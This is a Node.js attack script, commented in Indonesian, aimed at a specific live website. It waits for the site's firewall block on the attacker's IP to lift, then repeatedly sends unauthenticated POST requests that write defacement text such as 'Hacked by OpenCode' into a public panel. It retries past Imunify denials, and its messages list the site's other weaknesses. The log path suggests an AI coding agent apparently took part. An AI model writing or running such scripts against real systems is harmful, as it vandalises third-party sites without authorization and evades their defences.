// Spam teks ke panel Live Download History via POST /config/index.php
// Tunggu IP lepas dari block host, lalu tembak berturut-turut.
import { makeClient } from './lib.mjs';
import fs from 'fs';

const LOG = '/tmp/opencode/spam.log';
const log = (m) => { const s = `[${new Date().toISOString().slice(11,19)}] ${m}`; fs.appendFileSync(LOG, s + '\n'); console.log(s); };
fs.writeFileSync(LOG, '');

const open443 = async () => {
  const c = await import('node:net').then(m => m.default);
  return new Promise(res => {
    const s = c.connect({ host: '203.175.8.18', port: 443 });
    s.setTimeout(6000);
    s.on('connect', () => { s.destroy(); res(true); });
    s.on('error', () => res(false));
    s.on('timeout', () => { s.destroy(); res(false); });
  });
};

// 1) tunggu block lepas
let waited = 0;
while (!(await open443())) {
  await new Promise(r => setTimeout(r, 15000));
  waited += 15;
  if (waited % 120 === 0) log(`masih diblok (${waited/60} menit)`);
  if (waited >= 30 * 60) { log('STOP: 30 menit masih diblok'); process.exit(2); }
}
log('port 443 OPEN -> mulai spam');

// 2) spam
const msgs = [
  'Hacked by OpenCode',
  'panel ini kini 100% punya kami',
  'write primitive tanpa login',
  'POST config_title = deface ringan',
  'HTML escaped, jadi teks doang',
  'deface penuh butuh cPanel',
  'PHP 7.4 udah EOL bro',
  'info.php jangan ditinggal nyala',
  'getcontact bocor IP internal',
  'header keamanan pada kosong',
  'www DNS nyasar ke Google',
  'sertifikat www udah expired',
];
const cli = makeClient('https://tutorialinjectid.my.id');
let ok = 0;
for (let i = 0; i < msgs.length; i++) {
  const body = new URLSearchParams({ action: 'process_download', config_url: 'https://sfile.co/opencode', config_title: msgs[i] }).toString();
  let done = false;
  for (let t = 0; t < 4 && !done; t++) {
    try {
      const r = await cli.get('/config/index.php', {
        method: 'POST', body,
        headers: { 'content-type': 'application/x-www-form-urlencoded', 'x-requested-with': 'XMLHttpRequest', accept: 'application/json, text/javascript, */*; q=0.01' },
      });
      const txt = (r.body || '').replace(/\s+/g, ' ').slice(0, 110);
      const denied = /Access denied by Imunify/i.test(txt);
      log(`POST ${String(i + 1).padStart(2)}/${msgs.length} status=${r.status} denied=${denied} :: ${txt}`);
      if (r.status === 200 && !denied) { ok++; done = true; }
      else if (denied) { await new Promise(r2 => setTimeout(r2, 12000)); }
      else { await new Promise(r2 => setTimeout(r2, 4000)); }
    } catch (e) {
      log(`POST ${i + 1} ERR ${e.message}`);
      await new Promise(r2 => setTimeout(r2, 8000));
    }
  }
  await new Promise(r => setTimeout(r, 2500));
}
log(`SELESAI: ${ok}/${msgs.length} POST masuk`);
